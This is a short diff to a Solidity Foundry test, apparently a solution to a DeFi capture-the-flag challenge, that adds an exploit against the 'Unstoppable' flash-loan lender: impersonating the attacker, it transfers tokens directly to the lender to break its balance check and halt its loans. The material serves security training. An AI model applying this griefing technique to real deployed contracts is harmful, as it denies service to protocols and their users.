@@ -60,6 +60,13 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+
+        // send tokens to contract
+        // the contract is checking the token balance with address(this)
+        // breaking assert(poolBalance == balanceBefore)
+        vm.startPrank(attacker);
+        dvt.transfer(address(unstoppableLender), INITIAL_ATTACKER_TOKEN_BALANCE);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
